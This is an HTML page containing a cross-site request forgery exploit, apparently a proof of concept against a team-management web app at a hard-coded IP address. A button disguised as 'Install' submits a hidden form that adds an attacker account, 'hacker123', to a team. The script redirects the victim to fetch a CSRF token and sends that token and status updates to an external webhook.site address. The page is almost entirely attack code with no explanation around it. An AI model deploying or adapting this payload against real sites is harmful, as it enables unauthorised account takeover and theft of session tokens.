<!DOCTYPE html>
<html>
<body>
  <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hacker123" method="POST">
    <input type="hidden" name="csrfToken" id="csrfTokenInput">
    <input type="submit" id="installbutton" value="Install">
  </form>
  <script>
    // Function to send webhook notification
    function sendWebhook(status, details) {
      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
        method: 'POST',
        mode: 'cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
      })
      .then(response => {
        if (!response.ok) {
          console.error('Webhook POST failed:', response.status);
        }
      })
      .catch(err => console.error('Webhook Error:', err.message));
    }

    // Log script start
    sendWebhook('info', 'Script started');

    // Try to get CSRF token by redirecting to dashboard and back
    try {
      // Store the current URL to return after redirect
      const returnUrl = window.location.href;
      // Redirect to dashboard with a return URL parameter
      window.location.href = 'http://52.47.161.102:3000/?return=' + encodeURIComponent(returnUrl);
    } catch (err) {
      sendWebhook('failed', 'Redirect error: ' + err.message);
    }

    // Check if returning from dashboard
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('csrf')) {
      const csrfToken = urlParams.get('csrf');
      document.getElementById('csrfTokenInput').value = csrfToken;
      sendWebhook('info', 'CSRF token retrieved: ' + csrfToken);
      document.getElementById('exploitForm').submit();
      sendWebhook('success', 'Form submitted with CSRF token');
    }
  </script>
</body>
</html>
